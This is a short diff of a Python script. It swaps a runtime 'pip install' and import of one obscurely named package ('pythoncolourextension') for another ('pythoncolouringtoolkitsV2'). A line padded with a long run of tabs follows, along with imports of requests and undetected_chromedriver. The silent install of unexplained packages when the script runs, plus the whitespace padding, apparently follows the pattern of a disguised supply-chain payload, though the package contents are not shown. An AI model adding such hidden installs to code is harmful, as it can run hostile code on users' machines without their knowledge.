@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourextension")
-import pythoncolourextension
+os.system("pip install pythoncolouringtoolkitsV2")
+import pythoncolouringtoolkitsV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
